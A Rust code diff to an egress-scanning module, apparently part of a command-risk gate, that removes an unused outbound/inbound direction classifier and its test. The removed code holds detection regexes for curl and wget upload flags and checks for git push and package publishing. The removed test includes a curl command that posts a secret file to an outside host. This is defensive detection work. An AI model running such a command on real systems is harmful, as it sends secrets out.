@@ -29,27 +29,6 @@ pub struct EgressDestination {
     pub domain: String,
 }
 
-/// Direction a command moves data, used to weight an egress finding.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum EgressDirection {
-    /// Data leaves the host (push/upload/publish) — exfiltration-shaped.
-    Outbound,
-    /// Data enters the host (clone/pull/fetch) — benign download.
-    Inbound,
-    /// No clear network direction.
-    None,
-}
-
-impl EgressDirection {
-    pub fn as_str(self) -> &'static str {
-        match self {
-            Self::Outbound => "outbound",
-            Self::Inbound => "inbound",
-            Self::None => "none",
-        }
-    }
-}
-
 /// Extract every outbound destination referenced by `command`.
 pub fn scan_command(command: &str) -> Vec<EgressDestination> {
     let mut out = Vec::new();
@@ -183,55 +162,11 @@ pub fn scan_command(command: &str) -> Vec<EgressDestination> {
     out
 }
 
-/// Classify the command's net direction. Outbound (push/upload/publish) is the
-/// exfiltration-shaped case worth surfacing.
-pub fn detect_direction(command: &str) -> EgressDirection {
-    let lower = command.to_lowercase();
-
-    if lower.contains("git push") || lower.contains("git remote add") {
-        return EgressDirection::Outbound;
-    }
-    if lower.contains("git clone") || lower.contains("git pull") || lower.contains("git fetch") {
-        return EgressDirection::Inbound;
-    }
-    if lower.contains("gh repo create") || lower.contains("gh repo fork") {
-        return EgressDirection::Outbound;
-    }
-
-    static CURL_UPLOAD_RE: OnceLock<Regex> = OnceLock::new();
-    let curl_up = CURL_UPLOAD_RE.get_or_init(|| {
-        Regex::new(r"(?i)\bcurl\b.*(-X\s*(POST|PUT|PATCH)|--data|--data-raw|--data-binary|-d\s|-F\s|--form|--upload-file|-T\s)").unwrap()
-    });
-    if curl_up.is_match(command) {
-        return EgressDirection::Outbound;
-    }
-
-    static WGET_UPLOAD_RE: OnceLock<Regex> = OnceLock::new();
-    let wget_up = WGET_UPLOAD_RE.get_or_init(|| {
-        Regex::new(r"(?i)\bwget\b.*(--post-data|--post-file|--body-data|--body-file)").unwrap()
-    });
-    if wget_up.is_match(command) {
-        return EgressDirection::Outbound;
-    }
-
-    if lower.contains("npm publish")
-        || lower.contains("cargo publish")
-        || lower.contains("pip upload")
-        || lower.contains("twine upload")
-        || lower.contains("gem push")
-        || lower.contains("docker push")
-    {
-        return EgressDirection::Outbound;
-    }
-
-    if scan_command(command).is_empty() {
-        EgressDirection::None
-    } else {
-        // A destination is present but the verb isn't a clear push/pull — treat
-        // as outbound-leaning (data could be sent).
-        EgressDirection::Outbound
-    }
-}
+// GR-044 — `EgressDirection` + `detect_direction` were removed: dead code with
+// no production caller (evaluate_tool_risk gates on scan_command's destinations
+// regardless of direction, which is the safe default — an inbound/outbound
+// classification could only be used to SUPPRESS a finding, weakening the gate).
+// Re-introduce them WITH a consumer if direction-aware weighting is ever wanted.
 
 /// Extract the host from a URL authority (strips scheme, userinfo, port, and
 /// IPv6 brackets).
@@ -290,17 +225,6 @@ mod tests {
     fn benign_command_has_no_destinations() {
         assert!(scan_command("ls -la && cat README.md").is_empty());
         assert!(scan_command("echo hello | grep h").is_empty());
-    }
-
-    #[test]
-    fn direction_distinguishes_pull_from_push() {
-        assert_eq!(detect_direction("git clone https://github.com/x/y"), EgressDirection::Inbound);
-        assert_eq!(detect_direction("git push origin main"), EgressDirection::Outbound);
-        assert_eq!(
-            detect_direction("curl -X POST https://x.com -d @secret"),
-            EgressDirection::Outbound
-        );
-        assert_eq!(detect_direction("ls -la"), EgressDirection::None);
     }
 
     #[test]
